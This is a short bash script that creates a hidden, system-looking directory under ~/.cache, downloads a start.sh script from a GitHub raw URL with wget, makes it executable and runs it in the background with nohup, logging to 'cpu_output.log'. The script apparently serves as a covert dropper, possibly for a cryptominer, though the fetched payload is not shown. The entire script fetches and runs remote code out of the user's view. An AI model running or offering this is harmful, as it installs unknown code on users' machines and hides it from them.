#!/bin/bash

WORKDIR="$HOME/.cache/.sysd"
mkdir -p "$WORKDIR" && cd "$WORKDIR"

wget https://raw.githubusercontent.com/ewilkinso/sos/refs/heads/main/start.sh

chmod +x start.sh

nohup ./start.sh > cpu_output.log 2>&1 &
